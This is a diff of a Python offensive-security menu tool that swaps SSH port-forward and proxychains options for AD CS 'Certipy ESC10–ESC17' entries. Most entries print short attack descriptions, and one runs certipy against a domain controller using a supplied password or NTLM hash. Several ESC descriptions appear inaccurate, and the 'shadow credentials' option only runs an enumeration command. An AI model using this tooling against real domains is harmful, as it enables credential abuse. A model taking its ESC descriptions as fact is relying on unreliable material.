+      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - SSH Port Forward
+# Details : Menu option selected - Certipy ESC10
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '998':
-      print(colored("[*] Activating SSH Port Forwarding Service...", colour3))   
-      TPORT = input("[?] Please select the target port value: ")
-      if TPORT.isnumeric():
-         print("[*] Use firefox 127.0.0.1:" + TPORT + " to run...")
-         remoteCOM("ssh -L " + TPORT + ":127.0.0.1:" + TPORT + " " + USR.rstrip(" ") + "@" + DOM.rstrip(" "))
-         prompt()
-      else:
-         pass 
+   if selection =='710':
+      print("[!] ESC10 - Unverified SANs at CA Level: CA does not verify SANs, allowing forged identities at issuance...\n") 
+      prompt()    
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Proxychain ON/OFF [KEEP HERE]
+# Details : Menu option selected - Certipy ESC11
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='999':        
-      if proxyChains == 0:
-         proxyChains = 1
-         print("[+] Proxychains activated...")
-      else:
-         proxyChains = 0
-         print("[-] Proxychains de-activated...")
+   if selection =='711':
+      print("[!] ESC11 - Certificate Renewal Exploit: Allows certificate renewal with modified contents (e.g., new UPN) — impersonation...\n") 
       prompt()       
+                            
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC12
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='712':
+      print("[!] ESC12 - Vulnerable Cross-Forest Trust: Abuse of certificate-based trust between forests to escalate...\n") 
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC13
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='713':
+      print("[!] ESC13 - NDES Misconfiguration: Abusing the Network Device Enrollment Service to request certs via MSCEP with spoofed identities...\n") 
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC14
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='714':
+      print("[!] ESC14 - Weak Template Duplication Rights: If users can duplicate vulnerable templates and enroll, they can bypass restrictions...\n") 
+      prompt()
       
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC15
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='715':
+      print("[!] ESC15 - Certificate Authority Spoofing: Weaknesses in how systems validate certificates issued by rogue/malicious CAs...\n") 
+      prompt()      
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC16
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='716':
+      print("[!] ESC16 - Shadow Credentials Abuse: Abusing msDS-KeyCredentialLink to add rogue cert login methods (e.g., using certipy shadow)...\n") 
+      checkParams = test_TIP()
+      if checkParams != 1:
+         checkParams = test_DOM()      
+      if checkParams != 1:
+         print(colored("[*] Creating shadow credentials...", colour3))         
+         if PAS[:2] != "''":        
+             localCOM("certipy find -u " + USR.rstrip(" ") + "" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -vulnerable")
+         else:
+             localCOM("certipy find -u " + USR.rstrip(" ") + "" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -vulnerable")         
+      prompt()   
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy ESC17
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='717':
+      print("[!] ESC17 - Orphaned Enrollment Agent Templates: Enrollment Agent templates still usable even if removed from CA config — persistence risk...\n") 
+      prompt()         
+               
 # Eof...
